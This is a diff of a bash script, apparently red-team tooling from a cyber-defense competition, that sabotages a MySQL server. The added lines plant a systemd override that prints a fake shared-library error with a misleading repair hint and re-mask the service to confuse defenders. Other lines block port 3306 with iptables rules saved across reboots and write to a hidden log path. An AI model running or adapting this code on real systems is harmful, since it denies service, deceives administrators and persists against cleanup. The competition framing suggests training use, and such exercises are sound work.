@@ -1,5 +1,4 @@
 #!/bin/bash
-
 # ── WHITELIST ──────────────────────────────────────────
 WHITELIST=("greyteam" "scoring")
 LOG="/var/lib/.cache/mysql_watch.log"
@@ -27,15 +26,37 @@ if [ -f /etc/mysql/mysql.conf.d/mysqld.cnf ]; then
        /etc/mysql/mysql.conf.d/mysqld.cnf.bak
 fi
 
-# 5. Block MySQL port at firewall level
-#    but whitelist grey team and scoring IPs
-iptables -A INPUT  -p tcp --dport 3306 \
-    -s 10.100.0.0/24 -j ACCEPT          # allow grey team net
-iptables -A INPUT  -p tcp --dport 3306 \
-    -s 10.100.1.0/24 -j ACCEPT          # allow red net (yourself)
-iptables -A INPUT  -p tcp --dport 3306 -j DROP   # drop everyone else
+# 5. Unmask temporarily to apply fake override
+systemctl unmask mysql        2>/dev/null
 
-# 6. Save iptables rules so they survive reboot
+# 6. Plant fake error message
+mkdir -p /etc/systemd/system/mysql.service.d/
+tee /etc/systemd/system/mysql.service.d/override.conf > /dev/null << 'EOF'
+[Unit]
+Description=MySQL Database Server
+Documentation=man:mysqld(8)
+
+[Service]
+Type=oneshot
+ExecStart=/bin/bash -c 'echo "mysql: error while loading shared libraries: libmysql.so.5"; echo "Try: apt-get install --fix-broken"; exit 1'
+RemainAfterExit=no
+EOF
+
+# 7. Reload so fake message takes effect
+systemctl daemon-reload
+
+# 8. Remask so they hit masked error first
+#    then fake library error if they unmask
+systemctl mask mysql          2>/dev/null
+
+# 9. Block MySQL port but whitelist grey team and scoring
+iptables -A INPUT -p tcp --dport 3306 \
+    -s 10.100.0.0/24 -j ACCEPT          # allow grey team net
+iptables -A INPUT -p tcp --dport 3306 \
+    -s 10.100.1.0/24 -j ACCEPT          # allow red net
+iptables -A INPUT -p tcp --dport 3306 -j DROP
+
+# 10. Save iptables rules so they survive reboot
 iptables-save > /etc/iptables/rules.v4  2>/dev/null || \
 iptables-save > /etc/iptables.rules     2>/dev/null
 
